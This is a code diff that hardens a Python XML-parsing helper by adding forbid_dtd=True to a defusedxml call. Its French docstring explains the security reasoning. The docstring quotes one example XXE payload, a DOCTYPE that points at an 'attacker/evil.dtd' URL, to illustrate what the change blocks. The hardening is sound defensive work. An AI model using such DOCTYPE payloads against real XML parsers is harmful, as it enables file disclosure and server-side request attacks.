@@ -32,7 +32,16 @@ import defusedxml.ElementTree as _SafeET
 
 
 def safe_parse_xml(xml_bytes: bytes) -> Optional[ET.Element]:
-    """Parse du XML en bloquant les entités externes.
+    """Parse du XML en bloquant entités externes ET ``<!DOCTYPE>``.
+
+    Sprint S1.4 — durcissement : ``forbid_dtd=True`` ajouté en plus
+    des défauts ``defusedxml`` (``forbid_entities=True``,
+    ``forbid_external=True``).  Sans ``forbid_dtd``, un payload
+    ``<?xml...?><!DOCTYPE root SYSTEM "http://attacker/evil.dtd">``
+    est accepté (le fetch est bloqué par ``forbid_external`` mais
+    le DOCTYPE traverse le parser).  ALTO 4 et PAGE XML utilisent
+    ``xmlns`` plutôt que DOCTYPE — le durcissement est sans
+    régression sur le corpus institutionnel.
 
     Retourne ``None`` si le payload n'est pas un XML valide ou si
     ``defusedxml`` détecte une attaque
@@ -40,7 +49,7 @@ def safe_parse_xml(xml_bytes: bytes) -> Optional[ET.Element]:
     ``DTDForbidden``, ``NotSupportedError``).
     """
     try:
-        return _SafeET.fromstring(xml_bytes)
+        return _SafeET.fromstring(xml_bytes, forbid_dtd=True)
     except (ET.ParseError, defusedxml.DefusedXmlException):
         return None
 
